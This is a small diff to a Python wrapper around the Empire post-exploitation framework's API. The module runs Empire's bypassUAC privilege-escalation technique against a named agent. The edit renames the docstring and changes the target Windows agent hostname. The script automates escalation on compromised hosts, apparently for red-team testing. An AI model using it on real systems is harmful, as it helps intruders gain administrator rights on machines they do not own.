@@ -1,5 +1,5 @@
 """
-This module allows caller to select UAC bypass available within Empire.
+This module allows caller to select bypassUAC options available within Empire.
 """
 from EmpireAPIWrapper import empireAPI
 from empire_settings import *
@@ -24,7 +24,6 @@ def run(API, agent_name, module_name, listener=''):
 # for unit testing of each technique
 if __name__ == '__main__':
     API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
-    print(API.check_version())
-    agent_name = API.agent_get_name('pec-WIN10PRO64')
+    agent_name = API.agent_get_name('WIN-7JKBJEGBO38')
     run(API, agent_name, empire_autocomplete.privesc.bypassuac.path)
  
